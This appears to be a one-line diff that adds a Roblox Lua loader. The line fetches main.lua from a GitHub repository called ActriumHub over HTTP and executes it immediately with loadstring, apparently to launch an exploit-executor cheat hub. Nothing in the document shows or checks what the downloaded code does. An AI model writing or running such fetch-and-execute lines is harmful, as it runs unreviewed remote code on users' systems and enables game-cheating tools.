@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tyxca01/ActriumHub/refs/heads/main/main.lua"))()
